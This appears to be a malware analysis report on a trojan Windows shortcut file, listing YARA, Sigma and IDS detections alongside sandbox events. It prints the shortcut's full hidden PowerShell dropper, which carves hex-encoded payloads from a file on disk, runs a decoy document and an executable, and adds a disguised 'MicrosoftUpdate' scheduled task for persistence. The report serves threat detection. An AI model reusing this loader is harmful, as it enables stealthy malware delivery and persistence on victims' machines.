crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies archive (compressed) files in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

sigma_analysis_results.rule_title: Script Interpreter Execution From Suspicious Folder
sigma_analysis_results.rule_description: Detects a suspicious script execution in temporary folders or folders accessible by environment variables
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=Get-Location;$pa=@('C:\Users\Bruno\AppData\Local\Temp', $p);$ts=6032787;$pp=Get-ChildItem -Path $pa -Recurse *.* -File | Where-Object {$_.Length -eq $ts} | Select-Object -ExpandProperty FullName;$b=[IO.File]::ReadAllBytes($pp);$c=[System.Text.Encoding]::ASCII.GetString($b);$ai=$c.IndexOf('AEL')+3;$bi=$c.IndexOf('BEL');$ei=$c.IndexOf('EOF');$ah=$c.Substring($ai,$bi-$ai);$bh=$c.Subs [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Script Execution From Temp Folder
sigma_analysis_results.rule_description: Detects a suspicious script executions from temporary folder
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton

match_context.values: @{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=Get-Location;$pa=@('C:\Users\Bruno\AppData\Local\Temp', $p);$ts=6032787;$pp=Get-ChildItem -Path $pa -Recurse *.* -File | Where-Object {$_.Length -eq $ts} | Select-Object -ExpandProperty FullName;$b=[IO.File]::ReadAllBytes($pp);$c=[System.Text.Encoding]::ASCII.GetString($b);$ai=$c.IndexOf('AEL')+3;$bi=$c.IndexOf('BEL');$ei=$c.IndexOf('EOF');$ah=$c.Substring($ai,$bi-$ai);$bh=$c.Subs [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=Get-Location;$pa=@('C:\Users\Bruno\AppData\Local\Temp', $p);$ts=6032787;$pp=Get-ChildItem -Path $pa -Recurse *.* -File | Where-Object {$_.Length -eq $ts} | Select-Object -ExpandProperty FullName;$b=[IO.File]::ReadAllBytes($pp);$c=[System.Text.Encoding]::ASCII.GetString($b);$ai=$c.IndexOf('AEL')+3;$bi=$c.IndexOf('BEL');$ei=$c.IndexOf('EOF');$ah=$c.Substring($ai,$bi-$ai);$bh=$c.Subs [TRUNCATED]; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=Get-Location;$pa=@('C:\Users\Bruno\AppData\Local\Temp', $p);$ts=6032787;$pp=Get-ChildItem -Path $pa -Recurse *.* -File | Where-Object {$_.Length -eq $ts} | Select-Object -ExpandProperty FullName;$b=[IO.File]::ReadAllBytes($pp);$c=[System.Text.Encoding]::ASCII.GetString($b);$ai=$c.IndexOf('AEL')+3;$bi=$c.IndexOf('BEL');$ei=$c.IndexOf('EOF');$ah=$c.Substring($ai,$bi-$ai);$bh=$c.Subs [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.
Detects the creation of scheduled tasks by user accounts via the "schtasks" utility.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=schtasks.exe; Hashes=SHA1=85E046DE3C2DE1B4C85E57BA00CF7151B3D59F24,MD5=D857FA7279E2861199583474C17A1C6C,SHA256=DDDE64F0F55751763C1BCD53DE9CDFFC0D725D45A8476464A2A0422661813004,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /c schtasks /create /sc minute /mo 5 /tn MicrosoftUpdate /tr c:\programdata\3HNoWZd.exe /f ; CommandLine=schtasks  /create /sc minute /mo 5 /tn MicrosoftUpdate /tr c:\programdata\3HNoWZd.exe /f ; FileVersion=10.0.22621.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\schtasks.exe; Company=Microsoft Corporation}

lnk_info.command_line_arguments: -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$p=Get-Location;$pa=@('%temp%', $p);$ts=6032787;$pp=Get-ChildItem -Path $pa -Recurse *.* -File | Where-Object {$_.Length -eq $ts} | Select-Object -ExpandProperty FullName;$b=[IO.File]::ReadAllBytes($pp);$c=[System.Text.Encoding]::ASCII.GetString($b);$ai=$c.IndexOf('AEL')+3;$bi=$c.IndexOf('BEL');$ei=$c.IndexOf('EOF');$ah=$c.Substring($ai,$bi-$ai);$bh=$c.Substring($bi+3,$ei-$bi-3);function HB($he){$by=New-Object byte[] ($he.Length / 2);for ($i=0;$i -lt $by.Length;$i++){$by[$i]=[Convert]::ToByte($he.Substring($i*2,2),16);}return $by;}[IO.File]::WriteAllBytes('c:\programdata\NKView.hwp',(HB $ah));Start-Process 'c:\programdata\NKView.hwp';[IO.File]::WriteAllBytes('c:\programdata\3HNoWZd.exe',(HB $bh));Start-Process cmd -ArgumentList '/c schtasks /create /sc minute /mo 5 /tn MicrosoftUpdate /tr c:\programdata\3HNoWZd.exe /f' -WindowStyle Hidden;"

crowdsourced_ids_results.rule_msg: SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Adware)
crowdsourced_ids_results.rule_raw: alert tls any any -> any any (msg:"SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Adware)"; ja3_hash; content:"bc6c386f480ee97b9d9e52d472b772d8"; reference:url, sslbl.abuse.ch/ja3-fingerprints/bc6c386f480ee97b9d9e52d472b772d8/; sid:906200038; rev:1;)

attributes.magic: MS Windows shortcut, Item id list present, Has command line arguments, Icon number=1, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.
